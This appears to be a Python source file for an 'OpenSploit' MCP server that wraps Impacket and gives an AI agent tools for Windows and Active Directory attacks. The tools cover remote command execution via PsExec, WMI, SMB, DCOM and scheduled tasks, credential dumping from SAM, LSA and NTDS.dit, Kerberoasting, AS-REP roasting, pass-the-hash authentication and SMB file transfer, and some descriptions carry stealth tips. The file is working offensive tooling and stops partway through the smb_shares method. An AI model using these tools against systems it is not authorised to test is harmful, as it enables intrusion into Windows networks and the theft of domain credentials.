#!/usr/bin/env python3
"""
OpenSploit MCP Server: impacket

Windows/Active Directory exploitation toolkit wrapping Impacket scripts
for remote execution, credential dumping, Kerberos attacks, and SMB operations.
"""

import asyncio
import base64
import os
import re
import tempfile
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class ImpacketServer(BaseMCPServer):
    """MCP server wrapping Impacket for Windows/AD exploitation."""

    def __init__(self):
        super().__init__(
            name="impacket",
            description="Windows/AD exploitation toolkit (psexec, secretsdump, kerberoast, SMB)",
            version="1.0.0",
        )

        # ── Remote Execution ─────────────────────────────────────────────

        self.register_method(
            name="psexec",
            description="Execute commands on a remote Windows host via PsExec (creates a service, most reliable but noisy)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute (omit for interactive shell; use 'cmd.exe /c <cmd>' for single commands)",
                },
                "service_name": {
                    "type": "string",
                    "description": "Custom service name (default: random, for stealth use innocuous names)",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec (utf-8, cp437, cp850, etc.)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.psexec,
        )

        self.register_method(
            name="wmiexec",
            description="Execute commands on a remote Windows host via WMI (stealthier than psexec, no service creation)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute (omit for semi-interactive shell)",
                },
                "nooutput": {
                    "type": "boolean",
                    "default": False,
                    "description": "Do not retrieve command output (for blind execution)",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.wmiexec,
        )

        self.register_method(
            name="smbexec",
            description="Execute commands on a remote Windows host via SMB (native commands, no binary upload needed)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute",
                },
                "share": {
                    "type": "string",
                    "default": "C$",
                    "description": "Writable share for output (default: C$)",
                },
                "mode": {
                    "type": "string",
                    "enum": ["SHARE", "SERVER"],
                    "default": "SHARE",
                    "description": "Execution mode",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smbexec,
        )

        self.register_method(
            name="dcomexec",
            description="Execute commands on a remote Windows host via DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute",
                },
                "dcom_object": {
                    "type": "string",
                    "enum": ["MMC20", "ShellWindows", "ShellBrowserWindow"],
                    "default": "MMC20",
                    "description": "DCOM object to use for execution",
                },
                "nooutput": {
                    "type": "boolean",
                    "default": False,
                    "description": "Do not retrieve command output",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.dcomexec,
        )

        self.register_method(
            name="atexec",
            description="Execute commands on a remote Windows host via Task Scheduler (scheduled task based execution)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute via scheduled task",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.atexec,
        )

        # ── Credential Attacks ───────────────────────────────────────────

        self.register_method(
            name="secretsdump",
            description="Dump credentials from a Windows host (SAM, LSA secrets, cached creds, NTDS.dit via DRSUAPI/VSS)",
            params={
                **self._auth_params(),
                "just_dc": {
                    "type": "boolean",
                    "default": False,
                    "description": "Only extract NTDS.dit data via DRSUAPI (DC only, much faster)",
                },
                "just_dc_ntlm": {
                    "type": "boolean",
                    "default": False,
                    "description": "Only extract NTLM hashes from NTDS.dit (no Kerberos keys)",
                },
                "just_dc_user": {
                    "type": "string",
                    "description": "Extract only this user's hash from NTDS.dit",
                },
                "use_vss": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use Volume Shadow Copy instead of DRSUAPI (noisier but works when DRSUAPI fails)",
                },
                "exec_method": {
                    "type": "string",
                    "enum": ["smbexec", "wmiexec", "mmcexec"],
                    "description": "Remote execution method for VSS",
                },
                "timeout": {
                    "type": "integer",
                    "default": 600,
                    "description": "Timeout in seconds (credential dumping can be slow on large domains)",
                },
            },
            handler=self.secretsdump,
        )

        self.register_method(
            name="kerberoast",
            description="Kerberoasting attack - extract TGS service ticket hashes for offline cracking (targets accounts with SPNs)",
            params={
                **self._auth_params(),
                "request_user": {
                    "type": "string",
                    "description": "Target a specific user's SPN (default: all SPNs)",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["hashcat", "john"],
                    "default": "hashcat",
                    "description": "Hash output format",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.kerberoast,
        )

        self.register_method(
            name="asreproast",
            description="AS-REP Roasting - extract hashes for accounts with Kerberos pre-authentication disabled",
            params={
                **self._auth_params(),
                "usersfile": {
                    "type": "string",
                    "description": "File with list of usernames to test (one per line)",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["hashcat", "john"],
                    "default": "hashcat",
                    "description": "Hash output format",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.asreproast,
        )

        # ── SMB Operations ───────────────────────────────────────────────

        self.register_method(
            name="smb_shares",
            description="List SMB shares on a remote Windows host with access permissions",
            params={
                **self._auth_params(),
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smb_shares,
        )

        self.register_method(
            name="smb_get",
            description="Download a file from an SMB share",
            params={
                **self._auth_params(),
                "share": {
                    "type": "string",
                    "required": True,
                    "description": "Share name (e.g., 'C$', 'Users', 'SYSVOL')",
                },
                "remote_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path within the share (e.g., 'Windows\\System32\\config\\SAM')",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smb_get,
        )

        self.register_method(
            name="smb_put",
            description="Upload content to an SMB share",
            params={
                **self._auth_params(),
                "share": {
                    "type": "string",
                    "required": True,
                    "description": "Share name (e.g., 'C$', 'Users')",
                },
                "remote_path": {
                    "type": "string",
                    "required": True,
                    "description": "Destination path within the share",
                },
                "content": {
                    "type": "string",
                    "required": True,
                    "description": "Content to upload",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smb_put,
        )

        # ── Enumeration ──────────────────────────────────────────────────

        self.register_method(
            name="get_ad_users",
            description="Enumerate Active Directory users via LDAP (requires domain credentials)",
            params={
                **self._auth_params(),
                "all": {
                    "type": "boolean",
                    "default": False,
                    "description": "Return all user attributes (verbose)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.get_ad_users,
        )

        self.register_method(
            name="lookupsid",
            description="Brute-force SID enumeration to discover domain users, groups, and aliases",
            params={
                **self._auth_params(),
                "max_rid": {
                    "type": "integer",
                    "default": 4000,
                    "description": "Maximum RID to enumerate (default: 4000)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.lookupsid,
        )

        # ── Kerberos ─────────────────────────────────────────────────────

        self.register_method(
            name="get_tgt",
            description="Request a Kerberos TGT and save the ccache file for pass-the-ticket attacks",
            params={
                **self._auth_params(),
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.get_tgt,
        )

    # ── Helpers ──────────────────────────────────────────────────────────

    def _auth_params(self, extra_params: Optional[Dict] = None) -> Dict[str, Dict[str, Any]]:
        """Return common authentication parameter definitions."""
        params = {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target IP address or hostname",
            },
            "username": {
                "type": "string",
                "description": "Username for authentication",
            },
            "password": {
                "type": "string",
                "description": "Password for authentication",
            },
            "domain": {
                "type": "string",
                "description": "Active Directory domain name (e.g., 'CORP.LOCAL')",
            },
            "hashes": {
                "type": "string",
                "description": "NTLM hash in LM:NT format for pass-the-hash (e.g., 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0')",
            },
            "kerberos": {
                "type": "boolean",
                "default": False,
                "description": "Use Kerberos authentication (requires valid ccache or TGT)",
            },
            "dc_ip": {
                "type": "string",
                "description": "Domain Controller IP (required for Kerberos and some LDAP operations)",
            },
            "aes_key": {
                "type": "string",
                "description": "AES key for Kerberos authentication (128 or 256 bit hex)",
            },
            "port": {
                "type": "integer",
                "description": "Target port (default varies by protocol: 445 for SMB, 135 for WMI/DCOM)",
            },
        }
        if extra_params:
            params.update(extra_params)
        return params

    def _build_auth_args(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
    ) -> tuple:
        """
        Build Impacket CLI authentication format for target-based tools.

        Used by: psexec, wmiexec, smbexec, dcomexec, atexec, secretsdump,
                 lookupsid, smbclient (smb_shares/get/put).

        Returns:
            (target_str, extra_args) where target_str is '[domain/]user[:pass]@target'
            and extra_args is a list of additional CLI flags.
        """
        # Build target string: [domain/]user[:password]@target
        parts = []
        if domain:
            parts.append(f"{domain}/")
        if username:
            parts.append(username)
            if password:
                parts.append(f":{password}")
        parts.append(f"@{target}")
        target_str = "".join(parts)

        extra_args = []

        if hashes:
            extra_args.extend(["-hashes", hashes])
        if kerberos:
            extra_args.append("-k")
        if dc_ip:
            extra_args.extend(["-dc-ip", dc_ip])
        if aes_key:
            extra_args.extend(["-aesKey", aes_key])
        if port is not None:
            extra_args.extend(["-port", str(port)])

        return target_str, extra_args

    def _build_domain_auth_args(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
    ) -> tuple:
        """
        Build Impacket CLI authentication format for domain-based tools.

        Used by: GetUserSPNs (kerberoast), GetNPUsers (asreproast),
                 GetADUsers, getTGT.

        These tools expect 'domain/user[:pass]' (no @target). The DC IP
        is passed via -dc-ip flag, using the 'target' param if dc_ip is
        not explicitly set.

        Returns:
            (identity_str, extra_args) where identity_str is 'domain/user[:pass]'
            and extra_args includes -dc-ip.
        """
        # Build identity string: domain/user[:password] (no @target)
        parts = []
        if domain:
            parts.append(f"{domain}/")
        if username:
            parts.append(username)
            if password:
                parts.append(f":{password}")
        identity_str = "".join(parts)

        extra_args = []

        if hashes:
            extra_args.extend(["-hashes", hashes])
        if kerberos:
            extra_args.append("-k")
        # Use explicit dc_ip if set, otherwise use target as DC IP
        effective_dc_ip = dc_ip or target
        if effective_dc_ip:
            extra_args.extend(["-dc-ip", effective_dc_ip])
        if aes_key:
            extra_args.extend(["-aesKey", aes_key])

        return identity_str, extra_args

    def _parse_exec_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse output from execution commands (psexec, wmiexec, etc.)."""
        combined = stdout + stderr
        output_lines = []
        for line in combined.split("\n"):
            # Skip Impacket banner/info lines
            if line.startswith("Impacket ") or line.startswith("[*]") or line.startswith("[!]"):
                continue
            if line.strip():
                output_lines.append(line)
        return {
            "output": "\n".join(output_lines),
            "info": [l.strip() for l in combined.split("\n") if l.startswith("[*]") or l.startswith("[+]")],
            "warnings": [l.strip() for l in combined.split("\n") if l.startswith("[!]") or l.startswith("[-]")],
        }

    def _parse_secretsdump_output(self, stdout: str, stderr: str, output_prefix: str) -> Dict[str, Any]:
        """Parse secretsdump output and any generated files."""
        combined = stdout + stderr
        result = {
            "sam_hashes": [],
            "lsa_secrets": [],
            "cached_creds": [],
            "ntds_hashes": [],
            "kerberos_keys": [],
        }

        section = None
        for line in combined.split("\n"):
            line = line.strip()
            if not line:
                continue

            if "[*] Dumping local SAM hashes" in line:
                section = "sam"
                continue
            elif "[*] Dumping LSA Secrets" in line:
                section = "lsa"
                continue
            elif "[*] Dumping cached domain logon" in line:
                section = "cached"
                continue
            elif "[*] Dumping Domain Credentials" in line or "[*] Using the DRSUAPI" in line:
                section = "ntds"
                continue
            elif "[*] Kerberos keys grabbed" in line:
                section = "kerberos"
                continue
            elif line.startswith("[*]") or line.startswith("[!]"):
                continue

            if section == "sam" and ":" in line:
                result["sam_hashes"].append(line)
            elif section == "lsa" and line:
                result["lsa_secrets"].append(line)
            elif section == "cached" and ":" in line:
                result["cached_creds"].append(line)
            elif section == "ntds" and ":" in line and not line.startswith("["):
                result["ntds_hashes"].append(line)
            elif section == "kerberos" and ":" in line:
                result["kerberos_keys"].append(line)

        # Also read output files if they exist
        for suffix, key in [
            (".sam", "sam_hashes"),
            (".secrets", "lsa_secrets"),
            (".cached", "cached_creds"),
            (".ntds", "ntds_hashes"),
        ]:
            filepath = output_prefix + suffix
            if os.path.exists(filepath):
                try:
                    with open(filepath, "r", errors="replace") as f:
                        file_lines = [l.strip() for l in f if l.strip()]
                    if file_lines and not result[key]:
                        result[key] = file_lines
                except Exception:
                    pass

        result["total_hashes"] = (
            len(result["sam_hashes"])
            + len(result["ntds_hashes"])
            + len(result["cached_creds"])
        )

        return result

    def _parse_kerberoast_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse GetUserSPNs (kerberoasting) output."""
        combined = stdout + stderr
        hashes = []
        users_with_spns = []

        current_hash = []
        in_hash = False

        for line in combined.split("\n"):
            # Detect user/SPN table rows
            if line.startswith("$krb5tgs$"):
                in_hash = True
                current_hash = [line.strip()]
                continue
            elif in_hash:
                if line.strip() and not line.startswith("[") and not line.startswith("Impacket"):
                    current_hash.append(line.strip())
                    continue
                else:
                    hashes.append("".join(current_hash))
                    current_hash = []
                    in_hash = False

            # Parse table output for SPN info
            match = re.match(r"^(\S+)\s+(\S+)\s+(\S+)\s+(.*?)$", line.strip())
            if match and not line.startswith("ServicePrincipalName") and not line.startswith("-"):
                spn, name, member_of, pwd_last_set = match.groups()
                if "/" in spn:  # SPN format validation
                    users_with_spns.append({
                        "spn": spn,
                        "username": name,
                        "member_of": member_of,
                        "pwd_last_set": pwd_last_set.strip(),
                    })

        # Catch final hash
        if current_hash:
            hashes.append("".join(current_hash))

        return {
            "hashes": hashes,
            "hash_count": len(hashes),
            "users_with_spns": users_with_spns,
            "user_count": len(users_with_spns),
        }

    def _parse_asreproast_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse GetNPUsers (AS-REP roasting) output."""
        combined = stdout + stderr
        hashes = []
        vulnerable_users = []

        current_hash = []
        in_hash = False

        for line in combined.split("\n"):
            if line.startswith("$krb5asrep$"):
                in_hash = True
                current_hash = [line.strip()]
                continue
            elif in_hash:
                if line.strip() and not line.startswith("[") and not line.startswith("Impacket"):
                    current_hash.append(line.strip())
                    continue
                else:
                    hashes.append("".join(current_hash))
                    current_hash = []
                    in_hash = False

            if "does not require Kerberos preauthentication" in line:
                match = re.search(r"\$(\S+)", line)
                if match:
                    vulnerable_users.append(match.group(1))

        if current_hash:
            hashes.append("".join(current_hash))

        return {
            "hashes": hashes,
            "hash_count": len(hashes),
            "vulnerable_users": vulnerable_users,
        }

    def _parse_smb_shares(self, stdout: str, stderr: str) -> List[Dict[str, str]]:
        """Parse smbclient 'shares' command output."""
        shares = []
        combined = stdout + stderr
        for line in combined.split("\n"):
            # Match share listing lines like: "ADMIN$    DISK    Remote Admin"
            match = re.match(r"^\s*(\S+)\s+(DISK|IPC|PRINT)\s+(.*)?$", line.strip())
            if match:
                shares.append({
                    "name": match.group(1),
                    "type": match.group(2),
                    "comment": (match.group(3) or "").strip(),
                })
        return shares

    def _parse_ad_users(self, stdout: str, stderr: str) -> List[Dict[str, str]]:
        """Parse GetADUsers output."""
        users = []
        combined = stdout + stderr
        header_seen = False

        for line in combined.split("\n"):
            line = line.strip()
            if not line or line.startswith("[*]") or line.startswith("Impacket"):
                continue
            if line.startswith("Name") and "Email" in line:
                header_seen = True
                continue
            if line.startswith("----"):
                continue
            if header_seen and line:
                parts = line.split()
                if len(parts) >= 1:
                    user = {"name": parts[0]}
                    if len(parts) >= 2:
                        user["email"] = parts[1] if "@" in parts[1] else ""
                    if len(parts) >= 3:
                        user["created"] = " ".join(parts[-2:]) if len(parts) >= 4 else parts[-1]
                    users.append(user)

        return users

    def _parse_lookupsid_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse lookupsid output."""
        combined = stdout + stderr
        users = []
        groups = []
        aliases = []
        domain_sid = None

        for line in combined.split("\n"):
            line = line.strip()

            # Extract domain SID
            sid_match = re.match(r"^\[.*\]\s+Domain SID is:\s+(\S+)", line)
            if sid_match:
                domain_sid = sid_match.group(1)
                continue

            # Parse entries like: "500: DOMAIN\Administrator (SidTypeUser)"
            entry_match = re.match(r"^(\d+):\s+(\S+\\)?(\S+)\s+\((\w+)\)", line)
            if entry_match:
                rid = entry_match.group(1)
                domain_prefix = (entry_match.group(2) or "").rstrip("\\")
                name = entry_match.group(3)
                sid_type = entry_match.group(4)

                entry = {"rid": int(rid), "name": name, "type": sid_type}
                if domain_prefix:
                    entry["domain"] = domain_prefix

                if sid_type == "SidTypeUser":
                    users.append(entry)
                elif sid_type == "SidTypeGroup":
                    groups.append(entry)
                elif sid_type == "SidTypeAlias":
                    aliases.append(entry)

        return {
            "domain_sid": domain_sid,
            "users": users,
            "groups": groups,
            "aliases": aliases,
            "total": len(users) + len(groups) + len(aliases),
        }

    # ── Remote Execution Methods ─────────────────────────────────────────

    async def psexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        service_name: Optional[str] = None,
        codec: str = "utf-8",
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via PsExec (SMB service creation)."""
        self.logger.info(f"PsExec to {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-psexec"]
        cmd.extend(extra_args)
        if service_name:
            cmd.extend(["-service-name", service_name])
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.append(target_str)
        if command:
            cmd.append(command)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_exec_output(result.stdout, result.stderr)

            success = result.returncode == 0 or bool(parsed["output"].strip())
            return ToolResult(
                success=success,
                data={
                    "method": "psexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def wmiexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        nooutput: bool = False,
        codec: str = "utf-8",
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via WMI (stealthier, no service creation)."""
        self.logger.info(f"WMIExec to {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-wmiexec"]
        cmd.extend(extra_args)
        if nooutput:
            cmd.append("-nooutput")
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.append(target_str)
        if command:
            cmd.append(command)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_exec_output(result.stdout, result.stderr)

            success = result.returncode == 0 or bool(parsed["output"].strip())
            return ToolResult(
                success=success,
                data={
                    "method": "wmiexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def smbexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        share: str = "C$",
        mode: str = "SHARE",
        codec: str = "utf-8",
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via SMB (native commands, no binary upload)."""
        self.logger.info(f"SMBExec to {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-smbexec"]
        cmd.extend(extra_args)
        cmd.extend(["-share", share])
        cmd.extend(["-mode", mode])
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.append(target_str)

        # smbexec is interactive (no command positional arg). Pipe command to stdin.
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdin_data = f"{command}\nexit\n".encode() if command else b"exit\n"
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=stdin_data),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")
            parsed = self._parse_exec_output(stdout_str, stderr_str)

            success = proc.returncode == 0 or bool(parsed["output"].strip())
            return ToolResult(
                success=success,
                data={
                    "method": "smbexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(stdout_str + stderr_str),
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMBExec timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def dcomexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        dcom_object: str = "MMC20",
        nooutput: bool = False,
        codec: str = "utf-8",
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via DCOM objects."""
        self.logger.info(f"DCOMExec to {target} using {dcom_object}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-dcomexec"]
        cmd.extend(extra_args)
        cmd.extend(["-object", dcom_object])
        if nooutput:
            cmd.append("-nooutput")
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.append(target_str)
        if command:
            cmd.append(command)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_exec_output(result.stdout, result.stderr)

            success = result.returncode == 0 or bool(parsed["output"].strip())
            return ToolResult(
                success=success,
                data={
                    "method": "dcomexec",
                    "target": target,
                    "command": command,
                    "object": dcom_object,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def atexec(
        self,
        target: str,
        command: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        codec: str = "utf-8",
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via Task Scheduler."""
        self.logger.info(f"AtExec to {target}: {command}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-atexec"]
        cmd.extend(extra_args)
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.append(target_str)
        cmd.append(command)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_exec_output(result.stdout, result.stderr)

            success = result.returncode == 0 or bool(parsed["output"].strip())
            return ToolResult(
                success=success,
                data={
                    "method": "atexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    # ── Credential Attack Methods ────────────────────────────────────────

    async def secretsdump(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        just_dc: bool = False,
        just_dc_ntlm: bool = False,
        just_dc_user: Optional[str] = None,
        use_vss: bool = False,
        exec_method: Optional[str] = None,
        timeout: int = 600,
    ) -> ToolResult:
        """Dump credentials from a Windows host (SAM/LSA/NTDS.dit)."""
        self.logger.info(f"Secretsdump against {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Create temp directory for secretsdump output files
        tmpdir = tempfile.mkdtemp(prefix="secretsdump_")
        output_prefix = os.path.join(tmpdir, "secretsdump")

        cmd = ["impacket-secretsdump"]
        cmd.extend(extra_args)
        cmd.extend(["-outputfile", output_prefix])

        if just_dc:
            cmd.append("-just-dc")
        if just_dc_ntlm:
            cmd.append("-just-dc-ntlm")
        if just_dc_user:
            cmd.extend(["-just-dc-user", just_dc_user])
        if use_vss:
            cmd.append("-use-vss")
        if exec_method:
            cmd.extend(["-exec-method", exec_method])

        cmd.append(target_str)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_secretsdump_output(result.stdout, result.stderr, output_prefix)

            success = result.returncode == 0 or parsed["total_hashes"] > 0
            return ToolResult(
                success=success,
                data={
                    "target": target,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))
        finally:
            # Clean up output files and temp directory
            for suffix in [".sam", ".secrets", ".cached", ".ntds", ".ntds.kerberos", ".ntds.cleartext"]:
                filepath = output_prefix + suffix
                if os.path.exists(filepath):
                    try:
                        os.unlink(filepath)
                    except OSError:
                        pass
            try:
                os.rmdir(tmpdir)
            except OSError:
                pass

    async def kerberoast(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        request_user: Optional[str] = None,
        output_format: str = "hashcat",
        timeout: int = 120,
    ) -> ToolResult:
        """Kerberoasting - extract TGS service ticket hashes."""
        self.logger.info(f"Kerberoasting against {target}")

        identity_str, extra_args = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-GetUserSPNs"]
        cmd.extend(extra_args)
        cmd.append("-request")

        if request_user:
            cmd.extend(["-request-user", request_user])
        if output_format == "john":
            cmd.append("-outputfile")
            cmd.append("/tmp/kerberoast_john.txt")

        cmd.append(identity_str)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_kerberoast_output(result.stdout, result.stderr)

            success = result.returncode == 0 or parsed["hash_count"] > 0
            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "format": output_format,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def asreproast(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        usersfile: Optional[str] = None,
        output_format: str = "hashcat",
        timeout: int = 120,
    ) -> ToolResult:
        """AS-REP Roasting - extract hashes for accounts without pre-auth."""
        self.logger.info(f"AS-REP Roasting against {target}")

        identity_str, extra_args = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-GetNPUsers"]
        cmd.extend(extra_args)
        cmd.append("-request")

        if usersfile:
            cmd.extend(["-usersfile", usersfile])
        if output_format == "john":
            cmd.extend(["-format", "john"])
        else:
            cmd.extend(["-format", "hashcat"])

        cmd.append(identity_str)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_asreproast_output(result.stdout, result.stderr)

            success = result.returncode == 0 or parsed["hash_count"] > 0
            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "format": output_format,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    # ── SMB Operation Methods ────────────────────────────────────────────

    async def smb_shares(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """List SMB shares on a remote host."""
        self.logger.info(f"Listing SMB shares on {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
